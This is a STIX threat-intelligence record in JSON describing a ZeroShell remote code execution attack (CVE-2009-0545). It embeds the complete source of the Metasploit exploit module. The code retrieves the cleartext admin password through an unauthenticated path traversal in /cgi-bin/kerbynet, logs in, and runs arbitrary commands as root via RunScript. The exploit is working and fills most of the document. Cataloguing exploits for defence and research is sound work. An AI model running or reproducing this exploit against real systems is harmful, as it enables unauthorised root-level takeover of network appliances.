{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--42980859-432f-496d-ae5d-1405d8b0af52",
    "created": "2024-08-14T17:12:46.400461Z",
    "modified": "2024-08-14T17:12:46.400465Z",
    "name": "\"ZeroShell Remote Code Execution\"",
    "description": " This module exploits a vulnerability found in ZeroShell 2.0 RC2 and lower. It will leverage an unauthenticated local file inclusion vulnerability in the \"/cgi-bin/kerbynet\" url. The file retrieved is \"/var/register/system/ldap/rootpw\". This file contains the admin password in cleartext. The password is used to login as the admin user. After the authentication process is complete it will use the RunScript action to execute the payload with root privileges.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/zeroshell_exec.rb",
            "external_id": "zeroshell_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-0545"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::EXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"ZeroShell Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in ZeroShell 2.0 RC2 and lower.\n        It will leverage an unauthenticated local file inclusion vulnerability in the\n        \"/cgi-bin/kerbynet\" url. The file retrieved is \"/var/register/system/ldap/rootpw\".\n        This file contains the admin password in cleartext. The password is used to login\n        as the admin user. After the authentication process is complete it will use the\n        RunScript action to execute the payload with root privileges.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Yann CAM', # Discovery, PoC\n          'xistence <xistence[at]0x90.nl>' # Metasploit module\n        ],\n      'References'      =>\n        [\n          [ 'CVE', '2009-0545' ],\n          [ 'PACKETSTORM', '122799' ]\n        ],\n      'Platform'        => ['linux'],\n      'Arch'            => ARCH_X86,\n      'Targets'         =>\n        [\n          ['ZeroShell 2.0 RC2', {}]\n        ],\n      'Privileged'      => true,\n      'DisclosureDate'  => '2013-09-22',\n      'DefaultTarget'   => 0))\n\n    register_options(\n      [\n       OptString.new('TARGETURI', [true, 'The base path to the ZeroShell instance', '/'])\n      ])\n    deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')\n  end\n\n  def uri\n    return target_uri.path\n  end\n\n  def check\n    # Check version\n    print_status(\"Trying to detect ZeroShell\")\n\n    res = send_request_cgi({\n     'method' => 'GET',\n     'uri'    => normalize_uri(uri)\n    })\n\n    if res and res.code == 200 and res.body =~ /ZeroShell/\n      print_good(\"ZeroShell detected\")\n    end\n\n    unless password.nil?\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  # Retrieve admin password using unauthenticated LFI\n  def password\n    rootpw = \"../../../var/register/system/ldap/rootpw\"\n    print_status(\"Retrieving cleartext admin password\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, \"cgi-bin\", \"kerbynet\"),\n      'vars_get' => {\n        'Section' => \"NoAuthREQ\",\n        'Action'  => \"Render\",\n        'Object'  => rootpw\n      }\n    })\n\n    if res and res.code == 200 and res.body !~ /not found/\n      res.body =~ /^(.*)$/\n      pass = $1\n      print_status(\"Password retrieved [ #{pass} ]\")\n      return pass\n    else\n      return nil\n    end\n  end\n\n\n  # Login using the retrieved password and grab the session key from the response body.\n  def login(admin_password)\n    print_status(\"Log in and retrieving session key\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(uri, \"cgi-bin\", \"kerbynet\"),\n      'vars_post'   => {\n        'Action' => \"StartSessionSubmit\",\n        'User' => \"admin\",\n        'PW' => admin_password\n      }\n    })\n\n    if res and res.code == 200 and res.body =~ /STk=([a-zA-Z0-9]+)&Action/\n      sessionkey = $1\n      print_status(\"Session key retrieved [ #{sessionkey} ]\")\n      return sessionkey\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Retrieving session key failed!\")\n    end\n  end\n\n  # The RunScript action will run shell commands directly with root privileges.\n  def execute_command(cmd, opts)\n    script_name = rand_text_alphanumeric(8)\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(uri, \"cgi-bin\", \"kerbynet\"),\n      'vars_post'   => {\n        'Action' => \"RunScript\",\n        'Section' => \"Setup\",\n        'STk' => @session,\n        'ScriptName' => script_name,\n        'Script' => cmd + '&'\n      }\n    })\n\n    if res and res.code != 200\n      fail_with(Failure::Unknown, \"#{peer} - Unexpected response, exploit probably failed!\")\n    end\n\n  end\n\n  def exploit\n    admin_password = password\n    if admin_password.nil?\n      fail_with(Failure::Unknown, \"#{peer} - Retrieving password failed!\")\n    end\n\n    @session = login(admin_password)\n\n    execute_cmdstager({:flavor => :echo})\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-09-22",
    "x_mitre_platforms": [
        "['linux']"
    ]
}